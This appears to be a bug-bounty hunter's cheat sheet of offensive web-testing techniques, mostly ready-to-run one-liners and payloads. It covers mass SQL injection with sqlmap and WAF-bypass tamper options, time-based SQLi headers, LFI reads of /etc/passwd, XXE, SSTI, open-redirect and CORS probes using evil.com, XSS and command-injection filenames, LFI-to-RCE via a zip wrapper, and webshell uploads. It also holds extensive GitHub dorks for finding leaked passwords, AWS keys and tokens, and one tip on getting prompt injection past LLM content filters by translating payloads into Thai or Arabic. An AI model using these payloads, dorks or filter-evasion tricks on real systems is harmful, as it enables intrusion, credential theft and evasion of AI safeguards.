</details>

<details>
<summary>Cloudflare crawler</summary>

<dl>
<dd>

https://x.com/CloudflareDev/status/2031488099725754821?s=20

</dd>
</dl>

</details>

<details>
<summary>Some wordlists</summary>

<dl>
<dd>

https://t.co/TvCyduvlWN

</dd>
</dl>

</details>

<details>
<summary>Dont trust HTTP responses</summary>

<dl>
<dd>

Please don't trust HTTP responses, it might indicate that a resource is not deleted/updated with "false" value in response but actually the data is being deleted/modified if you try to call resource via API or check the resource via UI

</dd>
</dl>

</details>

<details>
<summary>Cache-Poisoning `Automation`</summary>

<dl>
<dd>

<details>
<summary>install https://github.com/fngoo/web_cache_poison</summary>



</details>

<details>
<summary>Usage</summary>

<dl>
<dd>

1. Gather all urls found in content-Discovery > urls.txt

2. xargs -a /path/to/urls.txt -I{} -d'\n' ./web\_cache\_poison.sh url {} > /out/cachepoison.txt

3. Find a tool to send request to unlimited hosts, and provided the targets as hosts so it requested and get us the response of all of the hosts, and stored responses in a file, with the response headers  
   than we grep for Cache to find Web Cache Vulns

</dd>
</dl>

</details>

<details>
<summary>Another one</summary>

<dl>
<dd>

https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner

</dd>
</dl>

</details>

<details>
<summary>tip</summary>

<dl>
<dd>

CDN cache bugs hide in normalization gaps.

Test same authenticated endpoint through variants:  
/account  
/account/  
/account%2f  
/account;%2fstyle.css  
/account..;/style.css

Watch: Cache-Status, Age, Set-Cookie, Vary, Authorization handling. One 200 with user data + public cache key is reportable fast.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Sqli</summary>

<dl>
<dd>

<details>
<summary>one liner</summary>

<dl>
<dd>

1. findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1

2. subfinder -d target.com | gau | grep "=" .txt | qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"

3. cat roots | assetfinder | httpx -silent | waybackurls | tee -a potential.txt ; gf sqli potential.txt >> sqli.txt ; sqlmap -m sqli.txt --dbs --batch --risk 3 --level 3

4. httpx -l targets. txt -silent -threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1’

<details>
<summary>Not recommended on WAF web-app :</summary>

<dl>
<dd>

gau DOMAIN.tld | sed 's/=[^=&]\*/=YOUR\_PAYLOAD/g' | grep ?\*= | sort -u | while read host;do (time -p curl -Is $host  
) 2>&1 | awk '/real/ { r=$2;if (r >= TIME\_OF\_SLEEP ) print h " => SQLi Time-Based vulnerability"}' h=$host ;done

</dd>
</dl>

</details>

1. http://sqlmap.org/

</dd>
</dl>

</details>

<details>
<summary>SQLi via headers</summary>

<dl>
<dd>

https://github.com/root-tanishq/userefuzz

<details>
<summary>Tip</summary>

<dl>
<dd>

1. Works best in php web-apps

User-Agent : "XOR(if(now()=sysdate(),sleep(5),0))XOR"  
===> 5.xx seconds delay

2. x-requested-with: 1 waitfor delay '0:0:5' --”

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>google dork</summary>

<dl>
<dd>

site:"" intext:\"sql syntax near\" | intext:\"syntax error has occurred\" | intext:\"incorrect syntax near\" | intext:\"unexpected end of SQL command\" | intext:\"Warning: mysql\_connect()\" | intext:\"Warning: mysql\_query()\" | intext:\"Warning: pg\_connect()\”

</dd>
</dl>

</details>

<details>
<summary>https://github.com/the-robot/sqliv</summary>



</details>

<details>
<summary>Using subfinder + waybackurls + sqlmap</summary>

<dl>
<dd>

1. subfinder -d target.com | tee -a domains

2. cat domains | httpx | tee -a urls.alive

3. cat urls.alive | waybackurls | tee -a urls.check

4. gf sqli urls.check >> urls.sqli

5. sqlmap -m urls.sqli --dbs --batch

</dd>
</dl>

</details>

<details>
<summary>Tip</summary>

<dl>
<dd>

1. Used google dorking to find login pages :

site:\*.domain.com inurl:login | inurl:signin | intitle:Login | intitle:"sign in" | inurl:auth

2. Opened all login pages and just capture requests of login

3. Send to intruder and add those payload list

4. If any response showing delay then save it as txt file and use it in sqlmap . Wait for banner . If waf protect then tamper the script and increase level,risk

5. Here are some tips that are used to easily find sql-Injection 100%  
   /?q=1  
   /?q=1'  
   /?q=1"  
   /?q=[1]  
   /?q[]=1  
   /?q=1`  
   /?q=1\  
   /?q=1/*'*/  
   /?q=1/*!1111'*/  
   /?q=1''asd'' <== concat string  
   /?q=1 or 1=1  
   /?q='or''='  
   /?q=")  
   /?q=')  
   /?q=-x()

</dd>
</dl>

</details>

<details>
<summary>Tip 2</summary>

<dl>
<dd>

Multi-part POST request, fed bSQLI payload in all fields, got 403, bypassed using a fake input:  
Content-Disposition: form-data; language="lang\_id" with payload:  
if(now()=sysdate(),sleep(xx),0) ==>SUCCESS!!

</dd>
</dl>

</details>

<details>
<summary>Tip 3</summary>

<dl>
<dd>

1. Gather all urls from waybackurls and Google Dorking.

2. Inject SQLi payload in all parameters one by one.

3. Analyze the response.  
   Payload used: 0'XOR(if(now()=sysdate(),sleep(10),0)) XOR'Z

</dd>
</dl>

</details>

<details>
<summary>Tip 4</summary>

<dl>
<dd>

subfinder -dL domains.txt | dnsx | waybackurl | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt

</dd>
</dl>

</details>

<details>
<summary>Tip 5</summary>

<dl>
<dd>

subfinder -dL domains.txt | dnsx | waybackurl | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt

</dd>
</dl>

</details>

<details>
<summary>tip</summary>

<dl>
<dd>

Sending payload within the URL/URI itself can also trigger SQL injection. So don't just focus on the parameters.

</dd>
</dl>

</details>

<details>
<summary>Learning</summary>

<dl>
<dd>

https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet

https://twitter.com/e11i0t_4lders0n/status/1477924287923195904?s=20&t=GKrwu5s19YIhSUhW2XBTpw

</dd>
</dl>

</details>

<details>
<summary>Tip</summary>

<dl>
<dd>

Always try the "\" character in login entries. It can trigger an SQL.

curl -d 'username=1\&password=1\' -X POST https :// login(.)domain(.)com

</dd>
</dl>

</details>

<details>
<summary>Accept-Language header</summary>

<dl>
<dd>

"Accept-Language: blah'; waitfor delay '0:0:9' --"

</dd>
</dl>

</details>

<details>
<summary>PHP Based web-app</summary>

<dl>
<dd>

When you hunt and the program language is PHP try access to any .php endpoint and test parameter 'id' and 'list[select]' for sql injection vulnerability.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Prompt injection tip</summary>

<dl>
<dd>

Prompt injection not working? Try changing your payload to Thai and Arabic languages.

I was able to bypass multiple LLM runtime safeguard features, including Azure Content Filter.

</dd>
</dl>

</details>

<details>
<summary>AI for bugbounty (see comments)</summary>

<dl>
<dd>

https://x.com/roohaa_n/status/2052404557502898268?s=20

</dd>
</dl>

</details>

<details>
<summary>Quick SQLi scanning</summary>

<dl>
<dd>

<details>
<summary>Tip 1</summary>

<dl>
<dd>

These 5 commands can help to easily identify SQL injection on our target domain:

1. subfinder -d target.com | tee -a domains

2. cat domains | httpx | tee -a urls.alive

3. cat urls.alive | waybackurls | tee -a urls.check

4. gf sqli urls.check >> urls.sqli

5. sqlmap -m urls.sqli --dbs --batch

<details>
<summary>(For Waf bypass add this in above 5th command :</summary>

<dl>
<dd>

-level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,ifnull2ifisnull,modsecurityversioned

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Tip 2</summary>

<dl>
<dd>

Sql bugs mostly found on shodan IPs and login panels

So if we work on some target we must gather all the shodan IPs for that target and start checking on login Panels and inject sql list on intruder on all the parameters

Also injection in login , signup , forget pages is must

</dd>
</dl>

</details>

<details>
<summary>Tips</summary>

<dl>
<dd>

1. https://twitter.com/GodfatherOrwa/status/1470719738091380738?s=20&t=gKaH2wX89dkXxLpTSP9mAQ

2. https://twitter.com/ADITYASHENDE17/status/1449691218116595716?s=20&t=xwnkkWxQ-uFbVJt7kEbSGA

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Getting stackstrace</summary>

<dl>
<dd>

One of the most successful ways to get a stacktrace, in my experience, is find a POST endpoint that accepts JSON, and send it malformed JSON. Works like 80% of the time.

Same goes for accept/contenttype header, some frameworks expect it to be "[something]/[something] or empty, if you put "BLA" in it, it may fail with a big "type unknown" or similar stacktrace!

</dd>
</dl>

</details>

<details>
<summary>XXE</summary>

<dl>
<dd>

https://github.com/BuffaloWill/oxml_xxe/

https://github.com/enjoiz/XXEinjector

<details>
<summary>XXE with SRF</summary>

<dl>
<dd>

<?xml version="1.0"?>  
<!DOCTYPE foo    
<!ELEMENT foo ([#ANY)>  
<!ENTITY xxe SYSTEM "http://localhost">]><foo>&xxe;</foo>

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>SSTI</summary>

<dl>
<dd>

<details>
<summary>https://github.com/epinna/tplmap</summary>



</details>

<details>
<summary>Quick SSTI</summary>

<dl>
<dd>

1. waybackurls http://target.com | qsreplace "daman{{9\*9}}" > fuzz.txt

> searched: daman81 in burp, got 43 results from 1266 requests, noiicee

2. ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/

3. for url in $(cat targets.txt); do python3 tplmap.py -u $url; print $url; done

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>LFI</summary>

<dl>
<dd>

<details>
<summary>one liner</summary>

<dl>
<dd>

1. gau domain.tld | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"’

2. waybackurls target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

3. cat targets.txt | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:\*" && echo "$host \0330;31mVulnerable\n";done

4. subfinder -d [target.com | httpx -follow-redirects -title -path /api/geojson?url=file:///etc/passwd -match-string "root:x:0:0"

5. cat target.txt | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path "///////../../../etc/passwd" -mr "root:x" | anew myP1s.txt

6. cat host.txt | naabu | httpx -nf | nuclei -t nuclei-templates/vulnerabilities/other/nginx-merge-slashes-path-traversal.yaml

7. gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q " root:x" && echo " VULN! %"’

</dd>
</dl>

</details>

<details>
<summary>Browser-based application LFI via view-source</summary>

<dl>
<dd>

It could also be a web app which takes your URL and screenshots it for you. You could simply find it anywhere where an URL is rendered on the server side.

Alright, now the actual tip:

Naturally as a bug hunter, you are going to try to access “file:///etc/passwd”, right? But what if it is blacklisted or somehow blocked? Try accessing “view-source:file:///etc/passwd” instead!

The “view-source” feature is often forgotten by developers in blacklists.

</dd>
</dl>

</details>

https://github.com/D35m0nd142/LFISuite

</dd>
</dl>

</details>

<details>
<summary>Grafana LFI mass scan</summary>

<dl>
<dd>

https://github.com/Cyber-Guy1/autoGrafana_LFI

</dd>
</dl>

</details>

<details>
<summary>LFI & SSRF & Open Redirect Burp search regex</summary>

<dl>
<dd>

Quick and dirty way to find parameters vulnerable to LFI & Path Traversal & SSRF & Open Redirect:  
Burp Search > Regex  
\?.\*=(\/\/?\w+|\w+\/|\w+(%3A|:)(\/|%2F)|%2F|[\.\w]+\.\w{2,4}[^\w])

</dd>
</dl>

</details>

<details>
<summary>open-redirect</summary>

<dl>
<dd>

<details>
<summary>Automation tool</summary>

<dl>
<dd>

https://github.com/devanshbatham/OpenRedireX

</dd>
</dl>

</details>

<details>
<summary>Curl</summary>

<dl>
<dd>

1. export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'

2. waybackurls target.com | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "http://evil.com" && echo -e "$host \0330;31mVulnerable\n" ;done

3. export LHOST="URL"; waybackurls $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"’

4. cat domain.txt | waybackurls | gf redirect | httpx -silent -timeout 5 -follow-redirects -path "[//bing.com" -location | anew

</dd>
</dl>

</details>

<details>
<summary>Tip</summary>

<dl>
<dd>

1. If you are testing Open Redirect but there is a blacklisted character, you can test it with a chinese dot to bypass it or any other Unicode Character.  
   example: redirect\_to=////evil%E3%80%82com

2. Account Login > open redirect

Steps:  
 1.Take this url : https://target.com///bing.com

2. Login your Account  
 3. Now we will be redirected http://bing.com

3. https://twitter.com/therceman/status/1573749312613502978?s=20&t=WgwzZjVAY7IkkAxRYAOAEA

4. Use chinest dot method:  
   Bypass open redirection whitelisted using chinese dots:  
   %E3%80%82  
   Tip: Keep eyes on SSO redirects

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Host Headers `Automation tools`</summary>

<dl>
<dd>

<details>
<summary>https://github.com/roottusk/xforwardy</summary>

<dl>
<dd>

<details>
<summary>install</summary>

<dl>
<dd>

```
git clone https://github.com/roottusk/xforwardy.git

pip install -r requirements.txt

python xforwardy.py
```

</dd>
</dl>

</details>

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Free some space on linux machine</summary>

<dl>
<dd>

go clean -cache -modcache

</dd>
</dl>

</details>

<details>
<summary>File upload</summary>

<dl>
<dd>

https://github.com/neex/ffmpeg-avi-m3u-xbin/

</dd>
</dl>

</details>

<details>
<summary>File upload hacks</summary>

<dl>
<dd>

<details>
<summary>Here’s a top 10 list of things that you can achieve by uploading</summary>

<dl>
<dd>

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE

2. **SVG**: Stored XSS / SSRF / XXE

3. **GIF**: Stored XSS / SSRF

4. **CSV**: CSV injection

5. **XML**: XXE

6. **AVI**: LFI / SSRF

7. **HTML / JS** : HTML injection / XSS / Open redirect

8. **PNG / JPEG**: Pixel flood attack (DoS)

9. **ZIP**: RCE via LFI / DoS

10. **PDF / PPTX**: SSRF / BLIND XXE

</dd>
</dl>

</details>

<details>
<summary>File extension list useful when to find vulnerabilities in file upload functionalities</summary>

<dl>
<dd>

ASP:

- .aspx

- .config

- .ashx

- .asmx

- .aspq

- .axd

- .cshtm

- .cshtml

- .rem

- .soap

- .vbhtm

- .vbhtml

- .asa

- .asp

- .cer

- .shtml

PHP:

- .php

- .php5

- .php3

- .php2

- .shtml

- .html

- .php.png(double extension attack)

<details>
<summary>Tip</summary>

<dl>
<dd>

ASP / PHP file with a webshell – RCE

HTML file with Javascript code – XSS

EICAR file – test possibility of hosting malware

Don’t forget to always try the NULL byte injection trick as well, e.g:

file.jpg%00shell.php

shell.php%00file.jpg

shell.php%00.jpg

files names testing

- `../../../tmp/lol.png` —> for path traversal

- `sleep(10)-- -.jpg` —> for SQL injection

- `<svg onload=alert(document.domain)>.jpg/png` —> for XSS

- `; sleep 10;` —> for command injections

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>https://twitter.com/0x0SojalSec/status/1566093568909144064?s=20&t=WgwzZjVAY7IkkAxRYAOAEA</summary>



</details>

<details>
<summary>Turning LFI to RCE in PHP using ZIP wrapper</summary>

<dl>
<dd>

1. Create a .php file (rce.php)

2. Compress it to a .zip file (file.zip)

3. Upload your .zip file on the vulnerable web application

4. Trigger your RCE via accessing:`https://site.com/index.php?page=zip://path/file.zip%23rce.php`

Note: `%23` is # symbol which serves as a delimiter between the archive filename and the filename inside the archive that we want to unzip.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Image upload hacks</summary>

<dl>
<dd>

If you find a file upload function for an image, try introducing an image with XSS in the filename like so:  
  
<img src=x onerror=alert('XSS')>.png  
"><img src=x onerror=alert('XSS')>.png  
"><svg onmouseover=alert(1)>.svg  
<<script>alert('xss')<!--a-->a.png

</dd>
</dl>

</details>

<details>
<summary>Easy P4</summary>

<dl>
<dd>

1. NOTE: 50/50 acceptance chance  
   Tired of getting duped with sessions cookies not invalidated after reset password? Try reporting CSRF token doesn't expire , easy P4/Low  
   inurl:http://trello.com AND intext:password AND intext:database

2. Logged into mobile app with email.  
   Logged into web app via Google SSO.  
   Deleted Account from Mobile Application, Session remains still active for web app

</dd>
</dl>

</details>

<details>
<summary>Advice for New comers</summary>

<dl>
<dd>

https://x.com/intigriti/status/1742848343171109269?s=20

</dd>
</dl>

</details>

<details>
<summary>Exposed Git/SVN directory</summary>

<dl>
<dd>

https://github.com/kost/dvcs-ripper

https://github.com/internetwache/GitTools

</dd>
</dl>

</details>

<details>
<summary>Race condition</summary>

<dl>
<dd>

https://github.com/insp3ctre/race-the-web

</dd>
</dl>

</details>

<details>
<summary>SQLMAP tip</summary>

<dl>
<dd>

SQLi Tip - If you're able to find a JSON POST-based potential SQL injection (SQLi), remember to execute the SQLMAP query with -u and --data using JSON input. I've found more success using this method in SQLMap than when using a request file

guide: https://it-docs.net/ddata/4956.pdf

</dd>
</dl>

</details>

<details>
<summary>CORS testing</summary>

<dl>
<dd>

<details>
<summary>Curl</summary>

<dl>
<dd>

1. gau "http://target.com" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done

2. site="URL"; gau "$site" | while read url; do target=$(curl -sIH "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found] echo $url; else echo Nothing on "$url"; fi; done

</dd>
</dl>

</details>

<details>
<summary>Automation</summary>

<dl>
<dd>

assetfinder fitbit.com | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "Origin: evil.com" {} | [ $(grep -c "[evil.com") -gt 0 ]] && printf "\n3[0;32m[VUL TO CORS] 30m{}"' 2>/dev/null

</dd>
</dl>

</details>

<details>
<summary>Learning</summary>

<dl>
<dd>

1. https://twitter.com/tamimhasan404/status/1477559342958145537?s=20&t=GKrwu5s19YIhSUhW2XBTpw

2. https://twitter.com/Rapid_API/status/1454165852660682757?s=20&t=34qtRbX86WQlf643pzPCLA

</dd>
</dl>

</details>

https://github.com/s0md3v/Corsy

https://github.com/RUB-NDS/CORStest

</dd>
</dl>

</details>

<details>
<summary>Prototype Pollution</summary>

<dl>
<dd>

1. subfinder -d [target.com -all -silent | httpx -silent -threads 300 | anew -q alive.txt && sed 's/$/\/?proto[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"

</dd>
</dl>

</details>

<details>
<summary>Github Dorking :</summary>

<dl>
<dd>

<details>
<summary>https://github.com/obheda12/GitDorker</summary>

<dl>
<dd>

<details>
<summary>install</summary>

<dl>
<dd>

$git clone https://github.com/obheda12/GitDorker

$pip3 install -r requirements.txt

</dd>
</dl>

</details>

<details>
<summary>Usage</summary>

<dl>
<dd>

$python3 GitDorker.py -tf \*tokensfile\* -q org:teslamotors

$python3 GitDorker.py -tf \*tokensfile\* -org teslamotors -d \*dorksfile\* -o \*outputfile\*

$python3 GitDorker.py -tf tokensfile.txt -q tesla.com -d dorks/demo\_dorks.txt

$python3 GitDorker.py -tf \*tokensfile\* -uf \*userfile\* -d dorks/\*DORK\_FILE\*

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>https://github.com/techgaun/github-dorks</summary>

<dl>
<dd>

<details>
<summary>install</summary>

<dl>
<dd>

$git clone https://github.com/techgaun/github-dorks.git

$ pip install requirements.txt

</dd>
</dl>

</details>

```
github-dork.py -r techgaun/github-dorks                          # search a single repo

github-dork.py -u techgaun                                       # search all repos of a user

github-dork.py -u dev-nepal                                      # search all repos of an organization

GH_USER=techgaun GH_PWD=<mypass> github-dork.py -u dev-nepal     # search as authenticated user

GH_TOKEN=<github_token> github-dork.py -u dev-nepal              # search using auth token

GH_URL=https://github.example.com github-dork.py -u dev-nepal    # search a GitHub Enterprise instance
```

</dd>
</dl>

</details>

<details>
<summary>https://github.com/sneakerhax/PyDorker</summary>

<dl>
<dd>

<details>
<summary>install</summary>

<dl>
<dd>

$git clone https://github.com/sneakerhax/PyDorker.git

$python3 -m pip install -r requirements.txt

</dd>
</dl>

</details>

$python Pydorker.py <site> <dorklist>

</dd>
</dl>

</details>

<details>
<summary>https://github.com/michenriksen/gitrob</summary>

<dl>
<dd>

<details>
<summary>install</summary>

<dl>
<dd>

$ go get github.com/michenriksen/gitrob

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>https://github.com/trufflesecurity/truffleHog</summary>

<dl>
<dd>

<details>
<summary>install</summary>

<dl>
<dd>

$ git clone https://github.com/trufflesecurity/trufflehog.git

$ cd trufflehog; go install

$*pip install -r requirements.txt*

</dd>
</dl>

</details>

trufflehog - -regex - -entropy false https://github.com/repo/repo.git

</dd>
</dl>

</details>

<details>
<summary>https://github.com/feeltheajf/truffleHog3</summary>



</details>

<details>
<summary>https://github.com/anshumanbh/git-all-secrets</summary>



</details>

<details>
<summary>https://github.com/d1vious/git-wild-hunt</summary>



</details>

<details>
<summary>https://github.com/ARPSyndicate/RepoHunt</summary>



</details>

<details>
<summary>https://github.com/hahwul/gitls</summary>



</details>

<details>
<summary>https://github.com/br0k3n-1337/github-dorks-for-bug-bounty-hunters</summary>



</details>

<details>
<summary>Tps:</summary>

<dl>
<dd>

https://twitter.com/thebinarybot/status/1568926898100502534?s=20&t=6VC1lmPwI-YNFAyaG1cLDQ

https://twitter.com/HackerGautam/status/1410157609735245826?s=20&t=aVdmeG-2AI_vi_Gow2DP4w

1- Github again  
2- "target .com" language:bash  
3- output analysis  
4- Get sensitive data

</dd>
</dl>

</details>

<details>
<summary>https://gist.github.com/jhaddix/77253cea49bf4bd4bfd5d384a37ce7a4</summary>



</details>

<details>
<summary>Multiple tools `All in one`</summary>

<dl>
<dd>

https://github.com/vinnyvinoth/github-search

</dd>
</dl>

</details>

<details>
<summary>Dorks</summary>

<dl>
<dd>

```
Similar to Shodan dorks etc we can pass dorks ot github to search repos alongside certain search terms such as filename etc

For example

Filename:.ipynb target password

filename:.bash_history paypal.com
filename:id_rsa paypal.com
filename:token paypal.com
filename:apikey paypal.com
language:python username paypal.com
language:python:username

app.secret.key is also a good one to search for.

extension:pem private
extension:ppk private
extension:sql mysql dump password
extension:json api.forecast.io
extension:json mongolab.com
extension:yaml mongolab.com
extension:ica [WFClient] Password=
extension:avastlic “support.avast.com”
extension:js jsforce conn.login
extension:json googleusercontent client_secret

“target.com” send_keys
“target.com” password
“target.com” api_key
“target.com” apikey
“target.com” jira_password
“target.com” root_password
“target.com” access_token
“target.com” config
“target.com” client_secret
“target.com” user auth

some unique git hub dorks to find AWS  keys✅
→http://target.com "AWS_ACCESS_KEY_ID"
→http://target.com "list_aws_accounts"
→http://target.com "aws_access_key"
→http://target.com "aws_secret_key"
→http://target.com "bucket_name"
→http://target.com "S3_ACCESS_KEY_ID"
→http://target.com "S3_BUCKET"
→http://target.com "S3_ENDPOINT"
→http://target.com "S3_SECRET_ACCESS_KEY"
org:Target "bucket_name"
org:Target "aws_access_key"
org:Target "aws_secret_key"
org:Target "S3_BUCKET"
org:Target "S3_ACCESS_KEY_ID"
org:Target "S3_SECRET_ACCESS_KEY"
org:Target "S3_ENDPOINT"
org:Target "AWS_ACCESS_KEY_ID"
org:Target "list_aws_accounts"

Here’s another list of GitHub dorks shared by @GodfatherOrwa for identifying various other credentials and secrets:

"target.com" password or secret
"target.atlassian" password
"target.okta" password
"corp.target" password
"jira.target" password
"target.onelogin" password
target.service-now password
some time only "target"

On Github Use This Dorks Every hour/day 
**OKTA**
http://okta.com password NOT help.okta NOT developer.okta NOT support.okta NOT www.okta
**ServiceNOW**
service-now password
**Jfrog**
http://jfrog.io password
**onelogin**
http://onelogin.com password

**SharePoint**
http://sharepoint.com password
**Auth0**
http://auth0.com password NOT docs.auth0

hooks. http://slack.com/services "Target"

When You Find Some Leaked Data search For If They Have Program Or security email 

i get lot bounty's on public/private programs Usain This randomly hunt
Happy hunt

**Atlassian**
http://atlassian.net password NOT domain.atlassian NOT user.atlassian NOT help.atlassian NOT
**Snow..**
http://snowflakecomputing.com password
**Slack**
http://slack.com  password
**Zendesk**
http://zendesk.com password NOT www.zendesk



There is a awesome list of dorks located here
#https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt


Its very common for devs to accidently push

".mlab.com password"
"access_key"
"access_token"
"amazonaws"
"api.googlemaps AIza"
"api_key"
"api_secret"
"apidocs"
"apikey"
"apiSecret"
"app_key"
"app_secret"
"appkey"
"appkeysecret"
"application_key"
"appsecret"
"appspot"
"auth"
"auth_token"
"authorizationToken"
"aws_access"
"aws_access_key_id"
"aws_key"
"aws_secret"
"aws_token"
"AWSSecretKey"
"bashrc password"
"bucket_password"
"client_secret"
"cloudfront"
"codecov_token"
"config"
"conn.login"
"connectionstring"
"consumer_key"
"credentials"
"database_password"
"db_password"
"db_username"
"dbpasswd"
"dbpassword"
"dbuser"
"dot-files"
"dotfiles"
"encryption_key"
"fabricApiSecret"
"fb_secret"
"firebase"
"ftp"
"gh_token"
"github_key"
"github_token"
"gitlab"
"gmail_password"
"gmail_username"
"herokuapp"
"internal"
"irc_pass"
"JEKYLL_GITHUB_TOKEN"
"key"
"keyPassword"
"ldap_password"
"ldap_username"
"login"
"mailchimp"
"mailgun"
"master_key"
"mydotfiles"
"mysql"
"node_env"
"npmrc _auth"
"oauth_token"
"pass"
"passwd"
"password"
"passwords"
"pem private"
"preprod"
"private_key"
"prod"
"pwd"
"pwds"
"rds.amazonaws.com password"
"redis_password"
"root_password"
"secret"
"secret.password"
"secret_access_key"
"secret_key"
"secret_token"
"secrets"
"secure"
"security_credentials"
"send.keys"
"send_keys"
"sendkeys"
"SF_USERNAME salesforce"
"sf_username"
"site.com" FIREBASE_API_JSON=
"site.com" vim_settings.xml
"slack_api"
"slack_token"
"sql_password"
"ssh"
"ssh2_auth_password"
"sshpass"
"staging"
"stg"
"storePassword"
"stripe"
"swagger"
"testuser"
"token"
"x-api-key"
"xoxb "
"xoxp"
[WFClient] Password= extension:ica
access_key
bucket_password
dbpassword
dbuser
extension:avastlic "support.avast.com"
extension:bat
extension:cfg
extension:env
extension:exs
extension:ini
extension:json api.forecast.io
extension:json googleusercontent client_secret
extension:json mongolab.com
extension:pem
extension:pem private
extension:ppk
extension:ppk private
extension:properties
extension:sh
extension:sls
extension:sql
extension:sql mysql dump
extension:sql mysql dump password
extension:yaml mongolab.com
extension:zsh
filename:.bash_history
filename:.bash_history DOMAIN-NAME
filename:.bash_profile aws
filename:.bashrc mailchimp
filename:.bashrc password
filename:.cshrc
filename:.dockercfg auth
filename:.env DB_USERNAME NOT homestead
filename:.env MAIL_HOST=smtp.gmail.com
filename:.esmtprc password
filename:.ftpconfig
filename:.git-credentials
filename:.history
filename:.htpasswd
filename:.netrc password
filename:.npmrc _auth
filename:.pgpass
filename:.remote-sync.json
filename:.s3cfg
filename:.sh_history
filename:.tugboat NOT _tugboat
filename:_netrc password
filename:apikey
filename:bash
filename:bash_history
filename:bash_profile
filename:bashrc
filename:beanstalkd.yml
filename:CCCam.cfg
filename:composer.json
filename:config
filename:config irc_pass
filename:config.json auths
filename:config.php dbpasswd
filename:configuration.php JConfig password
filename:connections
filename:connections.xml
filename:constants
filename:credentials
filename:credentials aws_access_key_id
filename:cshrc
filename:database
filename:dbeaver-data-sources.xml
filename:deployment-config.json
filename:dhcpd.conf
filename:dockercfg
filename:environment
filename:express.conf
filename:express.conf path:.openshift
filename:filezilla.xml
filename:filezilla.xml Pass
filename:git-credentials
filename:gitconfig
filename:global
filename:history
filename:htpasswd
filename:hub oauth_token
filename:id_dsa
filename:id_rsa
filename:id_rsa or filename:id_dsa
filename:idea14.key
filename:known_hosts
filename:logins.json
filename:makefile
filename:master.key path:config
filename:netrc
filename:npmrc
filename:pass
filename:passwd path:etc
filename:pgpass
filename:prod.exs
filename:prod.exs NOT prod.secret.exs
filename:prod.secret.exs
filename:proftpdpasswd
filename:recentservers.xml
filename:recentservers.xml Pass
filename:robomongo.json
filename:s3cfg
filename:secrets.yml password
filename:server.cfg
filename:server.cfg rcon password
filename:settings
filename:settings.py SECRET_KEY
filename:sftp-config.json
filename:sftp-config.json password
filename:sftp.json path:.vscode
filename:shadow
filename:shadow path:etc
filename:spec
filename:sshd_config
filename:token
filename:tugboat
filename:ventrilo_srv.ini
filename:WebServers.xml
filename:wp-config
filename:wp-config.php
filename:zhrc
HEROKU_API_KEY language:json
HEROKU_API_KEY language:shell
HOMEBREW_GITHUB_API_TOKEN language:shell
jsforce extension:js conn.login
language:yaml -filename:travis
msg nickserv identify filename:config
org:Target "AWS_ACCESS_KEY_ID"
org:Target "list_aws_accounts"
org:Target "aws_access_key"
org:Target "aws_secret_key"
org:Target "bucket_name"
org:Target "S3_ACCESS_KEY_ID"
org:Target "S3_BUCKET"
org:Target "S3_ENDPOINT"
